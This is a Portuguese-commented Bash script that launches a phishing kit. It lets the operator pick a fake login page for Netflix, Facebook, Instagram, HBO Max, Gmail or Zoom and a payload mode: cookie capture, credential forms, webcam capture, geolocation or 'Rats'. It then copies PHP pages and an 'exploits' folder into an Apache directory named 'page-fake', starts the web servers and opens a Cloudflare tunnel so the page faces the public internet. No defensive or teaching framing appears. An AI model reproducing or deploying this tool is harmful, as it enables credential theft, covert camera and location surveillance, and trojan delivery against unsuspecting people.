#!/bin/bash

# Cores para o terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color


# Variáveis
type_models="API/img" # Local das imagens
type_egs="API/models"  # Local dos modelos
apache="/var/www/html/page-fake/"  # Local do apache
php='/mnt/c/Windows/System32/cmd.exe /c start wt new-tab -- wsl bash -c "php -S localhost:8080; exec bash"'
cloudflare='/mnt/c/Windows/System32/cmd.exe /c start wt new-tab -- wsl bash -c "cloudflare tunnel --url localhost:8080; exec bash"'
c="clear" # Limpar

## Criando pastas
echo "[** criando nova pasta para o modelo **]"
mkdir /var/www/html/page-fake
echo "[** Modelo criado com sucesso **]"
$c

TERMINAL=$(command -v gnome-terminal || command -v xfce4-terminal || command -v x-terminal-emulator || echo "xterm") # Verifica o terminal disponível
$c

# Função para exibir o menu principal
show_model_menu() {
    $c
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|            ${GREEN}[**Escolha qual tipo de EG.S você deseja**]${NC}               ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"     
    echo -e "${YELLOW}|   1 --------------------------------->> ${GREEN}Standart${NC}                     ${YELLOW}|${NC}"         
    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"                     
    echo -e "${YELLOW}|   2 ------------------>> ${GREEN}Captura de cookies Beta${NC}                     ${YELLOW}|${NC}"
    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   3 ------------------------------->> ${GREEN}Formulario${NC}                     ${YELLOW}|${NC}"
    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   4 ---------------------->> ${GREEN}Formulario + Camera${NC}                     ${YELLOW}|${NC}"
    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   5 ------------------->> ${GREEN}Formulario + Geolocate${NC}                     ${YELLOW}|${NC}"
    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   6 --------->> ${GREEN}Formulario + Geolocate  + Camera${NC}                     ${YELLOW}|${NC}"
    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   7  ->> ${GREEN}Formulario + Geolocate  + Camera + Rats${NC}                     ${YELLOW}|${NC}"
    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   8 ------------------------------------>> ${GREEN}Login${NC}                     ${YELLOW}|${NC}"
    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   9 -------->> ${GREEN}Login +  Geolocate${NC}                                    ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   10 -------->> ${GREEN}Camera${NC}                                               ${YELLOW}|${NC}" 
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   11 -------->> ${GREEN}Login + Camera + Location${NC}                            ${YELLOW}|${NC}" 
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   12 -------->> ${GREEN}Login + Location + Rats${NC}                              ${YELLOW}|${NC}" 
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   13 -------->> ${GREEN}Login + Location${NC}                                     ${YELLOW}|${NC}" 
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   0 -------->> ${RED}Sair${NC}                                                  ${YELLOW}|${NC}" 
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
       echo -e " 
    "
    
}

# Função para exibir o menu de modelos
show_main_menu() {
    $c
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|                 ${GREEN}[**Escolha o tipo de modelo**]${NC}                       ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"     
    echo -e "${YELLOW}|   1 --------------------------------->> ${GREEN}Netflix${NC}                     ${YELLOW}|${NC}"         
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"                     
    echo -e "${YELLOW}|   2 ------------------>> ${GREEN}Facebook${NC}                                   ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   3 ------------------------------->> ${GREEN}Instagram${NC}                     ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   4 ---------------------->> ${GREEN}HboMax${NC}                                ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   5 ------------------->> ${GREEN}Gmail${NC}                                    ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   6 ------------------->> ${GREEN}Zoom${NC}                                    ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   0 -------->> ${RED}Voltar${NC}                                                ${YELLOW}|${NC}" 
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e " 
    "
}

# Função para processar a escolha do modelo
process_main_choice() {
    case $1 in
     1)
            echo -e "${GREEN}Você escolheu: Netflix${NC}" 
            cp "$type_models/1.jpg" "$apache"  > 1.jpg
            
            ;;
        2)
            echo -e "${GREEN}Você escolheu: Facebook${NC}"
            cp "$type_models/2.jpg" "$apache" > 1.jpg
            ;;
        3)
            echo -e "${GREEN}Você escolheu: Instagram${NC}"
            cp  "$type_models/3.jpg" "$apache" > 1.jpg
            ;;
        4)
            echo -e "${GREEN}Você escolheu: HboxMax${NC}"
            cp "$type_models/4.jpg" "$apache" > 1.jpg
            ;;
        5)
            echo -e "${GREEN}Você escolheu: Gmail${NC}"
            cp "$type_models/5.jpg" "$apache" > 1.jpg
            ;;
        6)
            echo -e "${GREEN}Você escolheu: Zoom${NC}"
            cp "$type_models/6.jpg" "$apache" > 1.jpg
            ;;
        0)
            echo -e "${RED}Voltando ao menu principal...${NC}"
            ;;
        *)
            echo -e "${RED}Opção inválida! Tente novamente.${NC}"
            ;;
    esac
}

# Função para processar a escolha do menu principal
process_model_choice() {
    case $1 in
        1)
            echo -e "${GREEN}Você escolheu: Standart${NC}"
            cp -r "$type_egs/index.php" "$apache"
            echo "[**Script carregado com sucesso no apache**]"
            cp -r "$type_egs/exploits/" "$apache"
            echo "[**Exploits Carregados com sucesso no apache**]"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &

            ;;
        2)
            echo -e "${GREEN}Você escolheu: Captura de cookies Beta${NC}"
            cp -r "$type_egs/2.php" "$apache"
            echo "[**Script carregado com sucesso no apache**]"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Apache carregado com sucesso**]"
            ;;
        3)
            echo -e "${GREEN}Você escolheu: Formulario${NC}"
            cp -r "$type_egs/3.php" "$apache"
            echo "[**Script carregado com sucesso no apache**]"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
            ;;
        4)
            echo -e "${GREEN}Você escolheu: Formulario + Camera${NC}"
            cp -r "$type_egs/4.php" "$apache"
            echo "[**Script carregado com sucesso no apache**]"
            echo "[**Iniciando Apache2**]"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
            ;;
        5)
            echo -e "${GREEN}Você escolheu: Formulario + Geolocate${NC}"
            cp -r "$type_egs/5.php" "$apache"
            echo "[**Script carregado com sucesso no apache**]"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
            ;;
        6)
            echo -e "${GREEN}Você escolheu: Formulario + Geolocate + Camera + Rats${NC}"
            cp -r "$type_egs/6.php" "$apache"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Script carregado com sucesso no apache**]"
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
            ;;
        7)
            echo -e "${GREEN}Você escolheu: Formulario + Geolocate + Rats${NC}"
            cp -r "$type_egs/7.php" "$apache"
            cp -r "$type_egs/exploits/" "$apache"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Script carregado com sucesso no apache**]"          
            echo "[**Exploits Carregados com sucesso no apache**]"
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
            ;;
        8)
            echo -e "${GREEN}Você escolheu: Login${NC}"
            cp -r "$type_egs/8.php" "$apache"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Script carregado com sucesso no apache**]"
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &       
            ;;
        9)
            echo -e "${GREEN}Você escolheu: Login + Geolocate${NC}"
            cp -r "$type_egs/9.php" "$apache"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Script carregado com sucesso no apache**]"
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &      
            ;;
        10)
            echo -e "${GREEN}Você escolheu: Camera com zoom ${NC}"
            cp -r "$type_egs/10.php" "$apache"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Script carregado com sucesso no apache**]"
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
            ;;
        11)
            echo -e "${GREEN}Você escolheu: Login + Camera + Location${NC}"
            cp -r "$type_egs/11.php" "$apache"
            cd $apache
            systemctl start apache2
            systemctl enable apache2.service
            echo "[**Script carregado com sucesso no apache**]"
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &      
            ;;
        12)
            echo -e "${GREEN}Você escolheu: Login + Location + Rats${NC}"
            cp -r "$type_egs/12.php" "$apache"
            echo "[**Script carregado com sucesso no apache**]"
            cp -r "$type_egs/exploits/" "$apache"
            echo "[**Exploits Carregados com sucesso no apache**]"
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &       
            ;;
        13)
            echo -e "${GREEN}Você escolheu: Login + Location${NC}"
            cp -r "$type_egs/13.php" "$apache"
            echo "[**Script carregado com sucesso no apache**]"
            echo "[**Apache carregado com sucesso**]"
            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
            ;;
        0) 
            echo -e "${RED}Saindo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opção inválida! Tente novamente.${NC}"
            ;;
    esac
}

while true; do
    show_main_menu  # Exibe o menu principal (Modelos)
    read -p "Escolha uma opção --->>> " choice

    if [[ $choice -eq 0 ]]; then
        echo -e "${RED}Saindo...${NC}"
        exit 0
    fi
    
    # Processa a escolha no menu principal (Modelos)
    process_main_choice $choice
    
    # Pausa para esperar o próximo input
    read -p "Pressione Enter para continuar..."

    # Agora, exibe o menu de EG.S após a escolha do modelo
    show_model_menu  # Exibe o menu de EG.S
    read -p "Escolha uma opção de --->>> " egs_choice
    process_model_choice $egs_choice  # Processa a escolha no menu EG.S
done
